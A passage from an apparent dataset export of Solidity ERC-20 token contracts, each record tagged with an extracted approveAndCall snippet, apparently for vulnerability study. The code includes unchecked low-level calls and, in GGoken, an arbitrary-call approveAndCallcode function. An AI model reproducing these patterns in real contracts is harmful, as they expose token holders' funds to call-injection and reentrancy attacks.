  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Nameless is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Nameless(\n ) {\n balances[msg.sender] = 99983740000000000000000000;\n totalSupply = 107975610000000000000000000;\n name = \"Nameless\";\n decimals = 18;\n symbol = \"NXN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14c9"
  },
  "filename": "32791.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Ballers is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Ballers(\n ) {\n balances[msg.sender] = 1000000;\n totalSupply = 1000000;\n name = \"Ballers\";\n decimals = 0;\n symbol = \"BLRS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14ca"
  },
  "filename": "32832.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract NeoBoostToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function NeoBoostToken(\n ) {\n balances[msg.sender] = 12000000000000000000000000;\n totalSupply = 12000000000000000000000000;\n name = \"Neo Booster\";\n decimals = 18;\n symbol = \"NEOBOOST\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14cb"
  },
  "filename": "32848.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract DashConnect is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function DashConnect(\n ) {\n balances[msg.sender] = 1000000000000000;\n totalSupply = 1000000000000000;\n name = \"DashConnect\";\n decimals = 8;\n symbol = \"DHCC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14cc"
  },
  "filename": "32864.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract DashConnect is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function DashConnect(\n ) {\n balances[msg.sender] = 1000000000000000;\n totalSupply = 1000000000000000;\n name = \"DashConnect\";\n decimals = 8;\n symbol = \"DHCC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14cd"
  },
  "filename": "32873.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EthereumLight is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EthereumLight(\n ) {\n balances[msg.sender] = 4000000;\n totalSupply = 4000000;\n name = \"Ethereum Light\";\n decimals = 18;\n symbol = \"ETHL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14ce"
  },
  "filename": "32878.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Lantos is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Lantos(\n ) {\n balances[msg.sender] = 100000000000000;\n totalSupply = 100000000000000;\n name = \"Lantos\";\n decimals = 8;\n symbol = \"XLN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14cf"
  },
  "filename": "32909.sol",
  "content": "pragma solidity ^0.4.15;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract GGoken is StandardToken {\n function () public payable {\n require(msg.value > 0 && receivedWei < targetWei);\n require(now > releaseTime);\n receivedWei += msg.value;\n walletAddress.transfer(msg.value);\n NewSale(msg.sender, msg.value);\n assert(receivedWei >= msg.value);\n }\n string public name = \"GG Token\";\n uint8 public decimals = 18;\n string public symbol = \"GG\";\n string public version = 'v0.1';\n address public founder;\n uint256 public targetWei;\n uint256 public receivedWei;\n uint256 public releaseTime;\n uint256 public allocateEndTime;\n address public walletAddress;\n event NewSale(address indexed _from, uint256 _amount);\n mapping(address => uint256) nonces;\n function GGoken(address _walletAddress) public {\n founder = msg.sender;\n walletAddress = _walletAddress;\n releaseTime = 1511695159;\n allocateEndTime = releaseTime + 1 days;\n targetWei = 2 ether;\n }\n function transferProxy(address _from, address _to, uint256 _value, uint256 _feeGg,\n uint8 _v,bytes32 _r, bytes32 _s) public returns (bool){\n if(balances[_from] < _feeGg + _value) revert();\n uint256 nonce = nonces[_from];\n bytes32 h = keccak256(_from,_to,_value,_feeGg,nonce);\n if(_from != ecrecover(h,_v,_r,_s)) revert();\n if(balances[_to] + _value < balances[_to]\n || balances[msg.sender] + _feeGg < balances[msg.sender]) revert();\n balances[_to] += _value;\n Transfer(_from, _to, _value);\n balances[msg.sender] += _feeGg;\n Transfer(_from, msg.sender, _feeGg);\n balances[_from] -= _value + _feeGg;\n nonces[_from] = nonce + 1;\n return true;\n }\n function approveProxy(address _from, address _spender, uint256 _value,\n uint8 _v,bytes32 _r, bytes32 _s) public returns (bool success) {\n uint256 nonce = nonces[_from];\n bytes32 hash = keccak256(_from,_spender,_value,nonce);\n if(_from != ecrecover(hash,_v,_r,_s)) revert();\n allowed[_from][_spender] = _value;\n Approval(_from, _spender, _value);\n nonces[_from] = nonce + 1;\n return true;\n }\n function getNonce(address _addr) public constant returns (uint256){\n return nonces[_addr];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(_extraData)) { revert(); }\n return true;\n }\n function allocateTokens(address[] _owners, uint256[] _values) public {\n if(msg.sender != founder) revert();\n if(allocateEndTime < now) revert();\n if(_owners.length != _values.length) revert();\n for(uint256 i = 0; i < _owners.length ; i++){\n address owner = _owners[i];\n uint256 value = _values[i];\n if(totalSupply + value <= totalSupply || balances[owner] + value <= balances[owner]) revert();\n totalSupply += value;\n balances[owner] += value;\n }\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}",
    "function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(_extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14d0"
  },
  "filename": "32925.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SailorsCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SailorsCoin(\n ) {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"SailorsCoin\";\n decimals = 18;\n symbol = \"SLCN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14d1"
  },
  "filename": "32935.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract TestToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function TestToken(\n ) {\n balances[msg.sender] = 100000;\n totalSupply = 100000;\n name = \"TestToken\";\n decimals = 2;\n symbol = \"TIT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14d2"
  },
  "filename": "32948.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract TripleCoin is StandardToken 